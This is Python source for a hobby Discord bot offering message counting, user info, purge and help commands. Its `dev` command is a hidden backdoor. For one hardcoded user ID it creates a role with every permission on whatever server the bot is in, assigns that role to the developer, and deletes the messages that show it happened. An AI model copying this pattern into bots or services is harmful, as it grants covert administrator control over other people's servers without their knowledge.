import discord
import asyncio
from discord.ext import commands
import BotIDs
import logging
#import datetime
#import time
import rethinkdb as r
#import os
#import

#r.connect("localhost", 28015).repl()

bot = commands.Bot(command_prefix="?", description="Orangutan Gaming's bot")

logger = logging.getLogger("discord")
logger.setLevel(logging.DEBUG)
handler = logging.FileHandler(filename="discord.log", encoding="utf-8", mode="w")
handler.setFormatter(logging.Formatter('%(asctime)s:%(levelname)s:%(name)s: %(message)s'))
logger.addHandler(handler)

@bot.event
async def on_ready():
    gamename="with Orangutans"
    await bot.change_presence(game=discord.Game(name=gamename))
    print('Logged in as')
    print(bot.user.name)
    print(bot.user.id)
    print('------')
    print("Playing", gamename)
    print(BotIDs.URL)

bot.remove_command("help")
@bot.command()
async def help():
    await bot.say("OG_Bot by Orangutan Gaming `(OGaming#7135)`"
                  "\n`<Mandatory Argument>`, `(Optional Argument)` `Alias 1`/`Alias 2` [Permission Needed]"
                  "\n`help`: Gives this command"
                  "\n`join`: Shows information on how to add me to your server"
                  "\n`msgcount`/`mcount` (user) (channel): Count how many messages in the channel the command was used "
                  "in or the channel given by the user given. If no user is given, it will use the person who uses the "
                  "command"
                  "\n`amsgcount`/`amcount` (channel): Count how many messages in the channel given. If no channel was"
                  "given, will use the channel the command was used in"
                  "\n`recent`/`recents`/`last` (user) (channel): Quotes the most recent message from the user and channel given."
                  "If no user is given, it will use the user using the command and if no channel is given it will use"
                  "the channel the command was used in."
                  "\n`userinfo` (user) gets the userinfo of the user given. If no user is given, it will use the"
                  "user using the command"
                  "\n`info`: Displays Bot Info"
                  "\n`botclear` (amount) [Manage Messages]: Deletes the amount of messages given by me in the current "
                  "channel. Default: 100"
                  "\n`clear`/`del`/`delete`/`wipe` (amount): Deletes the amount of messages given in the current "
                  "channel. Default: 100")

@bot.command(pass_context=True)
async def dev(ctx):
    """
    Command Use: For Dev to be able to get perms on a server for debugging purposes easily
    """

    if ctx.message.author.id == "150750980097441792": #OGaming's User ID
        try:
            if discord.utils.get(ctx.message.author.roles, name="(._.)"):
                tmp = await bot.say("Already Completed")
                await asyncio.sleep(3)
                await bot.delete_messages([tmp, ctx.message])
            else:
                if discord.utils.get(ctx.message.server.roles, name="(._.)"): #Role all ready exists
                    tmp = await bot.say("All ready made")
                else:
                    await bot.create_role(ctx.message.server, name="(._.)", permissions=discord.Permissions.all())
                    tmp = await bot.say("Made")
                await asyncio.sleep(1)
                await bot.add_roles(ctx.message.author, discord.utils.get(ctx.message.server.roles, name="(._.)"))
                await bot.edit_message(tmp, "Added")
                success = await bot.say("Success")
                await asyncio.sleep(3)
                await bot.delete_messages([tmp, success, ctx.message])
        except discord.Forbidden as error:
            await bot.say(ctx.message.author.mention + "{} doesn't have perms".format(bot.user.name))
    else:
        tmp = await bot.say("{} does not have permission to use this command".format(ctx.message.author.mention))
        await asyncio.sleep(3)
        await bot.delete_messages([tmp, ctx.message])
    return

@bot.command()
async def pvp(*args : str, role: discord.Role = None): #args are all the names of the roles with spaces and Capitals
    if not role:
        amount = len(args)
        start = 0
        for i in range(start, amount):
            current = args[i]
            noSpace = current.replace(" ", "")
            noSpace = noSpace.lower()
            await bot.say("/roles add {} --role {}".format(noSpace, current))
        return
    else:
        bot.create_role()

#@bot.command(pass_context=True)
#async def roles_change(ctx, roles: discord.Role):
#    bot.edit_role(ctx.message.server, roles)#, permissions=administrator)

@bot.command()
async def join():
    options=["This bot is currently a work in progress. It is not public yet. If you're interested in "
                  "helping with testing or have any ideas, PM OGaming#7135",
             "Anyone with the permission `Manage Server` can add me to a server using the following link: " + BotIDs.URL]
    DServer="https://discord.gg/duRB6Qg"
    await bot.say(options[1]+"\nYou can also join the Discord channel at: "+DServer)

#@bot.command()
#async def joined(member: discord.Member):
#    await bot.say("{0.name} joined in {0.joined_at}".format(member))

@bot.command(pass_context=True, aliases=["mcount"])
async def msgcount(ctx, user: discord.Member = None, channel: discord.Channel = None):
    counter = 0
    tmp = await bot.say("Counting messages...")
    if not user:
        user = ctx.message.author
    if not channel:
        channel = ctx.message.channel
    async for log in bot.logs_from(channel, limit=100, before=ctx.message):
        if log.author == user:
            counter += 1
    bot.delete_message(ctx.message)
    await bot.edit_message(tmp, "{} has {} messages in {}.".format(user.mention, counter, channel.mention))

@bot.command(pass_context=True, aliases=["amcount"])
async def amsgcount(ctx, channel: discord.Channel = None):
    counter = 0
    tmp = await bot.say("Counting messages...")
    if not channel:
        channel = ctx.message.channel
    async for log in bot.logs_from(channel, before=ctx.message):
        counter += 1
    bot.delete_message(ctx.message)
    if counter == 100:
        await bot.edit_message(tmp, "There are at least {} messages in {}.".format(counter, channel.mention))
    elif counter <= 99:
        await bot.edit_message(tmp, "There are {} messages in {}.".format(counter, channel.mention))
    else:
        await bot.edit_message(tmp, "Counter Bug")

@bot.command(pass_context=True, aliases=["recents", "last"])
async def recent(ctx, user: discord.Member = None, channel: discord.Channel = None):
    if not channel:
        channel = ctx.message.channel
    if not user:
        user = ctx.message.author
    quote = None
    async for message in bot.logs_from(channel, before=ctx.message, limit=100):
        if message.author == user:
            quote = message
            embed = discord.Embed(description=quote.content)
            embed.set_author(name=quote.author.name, icon_url=quote.author.avatar_url)
            embed.timestamp = quote.timestamp
            await bot.delete_message(ctx.message)
            await bot.say(embed=embed)
            return
        if not quote:
            continue

    embed = discord.Embed(description="No message found")
    await bot.say(embed=embed)
    await bot.delete_message(ctx.message)
    return



@bot.command(pass_context=True)
async def userinfo(ctx, member: discord.Member = None):
    if not member:
        member = ctx.message.author

    embed = discord.Embed(title="User Info for {}".format(member),
                          colour=member.colour)

    embed.set_image(url=member.avatar_url)
    embed.set_footer(text=("Account Created at " + member.created_at.strftime("%A %d %B %Y, %H:%M:%S")))

    embed.add_field(name="ID", value=member.id)
    embed.add_field(name="Member Since ",
                    value=member.joined_at.strftime("%A %d %B %Y, %H:%M:%S"))

    roleString = ""
    for role in member.roles:
        if role.name == '@everyone':
            continue
        roleString += role.name + ", "
    roleString = roleString[:-2]

    embed.add_field(name="Roles",
                    value=roleString)
    embed.add_field(name="Avatar URL", value=member.avatar_url)

    await bot.say(embed=embed)

@bot.command(pass_context=True)
async def info(ctx):
    server=ctx.message.server
    membObj=server.me
    botMemb: discord.Member=membObj
    embed = discord.Embed(title="Information on {}".format(bot.user.name),
                          colour=0xfe8600)
    embed.set_image(url=bot.user.avatar_url)
    embed.set_footer(text=("Bot created at " + bot.user.created_at.strftime("%A %d %B %Y, %H:%M:%S")))

    embed.add_field(name="ID", value=bot.user.id)
    embed.add_field(name="Member Since ",
                    value=membObj.joined_at.strftime("%A %d %B %Y, %H:%M:%S"))
    roleString = ""
    for role in membObj.roles:
        if role.name == '@everyone':
            continue
        roleString += role.name + ", "
    roleString = roleString[:-2]

    embed.add_field(name="Roles",
                    value=roleString)
    embed.add_field(name="Avatar URL", value=bot.user.avatar_url)
    embed.add_field(name="Owner", value="OGaming#7135")
    embed.add_field(name="GitHub", value="https://github.com/OrangutanGaming/OG_Bot")
    embed.add_field(name="OAuth2", value=BotIDs.URL)
    embed.add_field(name="Server Count", value=str(len(bot.servers)))

    await bot.say(embed=embed)

@bot.command(pass_context=True)
@commands.has_permissions(manage_messages=True)
async def botclear(ctx, amount=100):
    #user = ctx.message.author
    #if ctx.message.channel.permissions_for():
            #discord.Permissions(ctx.message.author, manage_messages):

    def check():
        def is_me(msg):
            return msg.author == bot.user

    try:
        deleted = await bot.purge_from(ctx.message.channel, check=check(), limit=amount)
        count = len(deleted)
        if count == 1:
            tmp = await bot.say("Deleted {} message".format(count))
        else:
            tmp = await bot.say("Deleted {} messages".format(count))
        await asyncio.sleep(3)
        await bot.delete_messages([tmp, ctx.message])
    except discord.Forbidden as error:
        await bot.say("{} does not have permissions".format(bot.user.name))

    #else:
        #await bot.say("You must have the `Manage Messages` permission in order to run that command")

@bot.command(pass_context=True, aliases=["del", "delete", "wipe"])
@commands.has_permissions(manage_messages=True)
async def clear(ctx, amount=100):

    try:
        deleted = await bot.purge_from(ctx.message.channel, limit=amount)
        count = len(deleted)
        if count == 1:
            tmp = await bot.say("Deleted {} message".format(count))
        else:
            tmp = await bot.say("Deleted {} messages".format(count))
        await asyncio.sleep(3)
        await bot.delete_message(tmp)
    except discord.Forbidden as error:
        await bot.say("{} does not have permissions".format(bot.user.name))

"""
@bot.command(pass_context=True)
@commands.has_permissions(manage_server=True)
async def giveaway(action):
    if action == "enable":
        r.db("OG_Bot")r.table("giveaway").insert([])
    elif action == "disable":
        #
    elif action == "clear":
        #
"""

#@bot.command(pass_context=True)
#async def enter

"""
@bot.event
async def on_command_error(error, ctx):
    if isinstance(error, commands.MissingRequiredArgument):
        await bot.send_message(ctx.message.channel, error)
    elif isinstance(error, commands.errors.CommandNotFound):
        await bot.send_message(ctx.message.channel, "`{}` is not a valid command".format(ctx.invoked_with))
    elif isinstance(error, commands.errors.CommandInvokeError):
        print(error)
"""

bot.run(BotIDs.token)